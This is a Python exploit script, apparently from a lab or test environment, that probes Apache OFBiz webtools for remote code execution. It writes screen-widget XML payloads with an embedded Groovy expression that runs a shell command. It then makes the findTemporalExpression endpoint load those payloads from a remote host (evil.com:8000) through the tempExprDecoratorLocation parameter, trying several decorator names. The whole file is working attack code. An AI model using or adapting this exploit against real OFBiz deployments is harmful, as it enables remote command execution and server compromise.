# -*- coding: utf-8 -*-
"""试探 Temporal 装饰器期望的远程 Screen 名称。"""
import io
import re
import sys

sys.path.insert(0, "..")
from common import session  # noqa: E402

XML_TPL = """<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
    <screen name="{name}">
        <section>
            <actions>
                <set value="${{groovy:'touch /tmp/bypass_temporal_{tag}'.execute()}}"/>
            </actions>
        </section>
    </screen>
</screens>
"""

s = session()
names = ["StatsDecorator", "TemporalExpressionDecorator", "TempExprDecorator",
         "FindTemporalExpression", "TemporalExpr"]
for i, name in enumerate(names):
    tag = i + 1
    io.open(r"..\..\infrastructure\www\payloads\ofbiz_bt_%d.xml" % tag, "w",
            encoding="utf-8").write(XML_TPL.format(name=name, tag=tag))
    r = s.post("https://127.0.0.1:18381/webtools/control/main/findTemporalExpression",
               data={"tempExprDecoratorLocation":
                     "http://evil.com:8000/payloads/ofbiz_bt_%d.xml" % tag},
               timeout=30, allow_redirects=False)
    hit = re.search(r"(Exception|error|not found|Screen)[^<]{0,120}", r.text, re.I)
    print("%-30s HTTP %s %dB | %s" % (name, r.status_code, len(r.content),
                                      hit.group(0)[:100] if hit else "clean"))
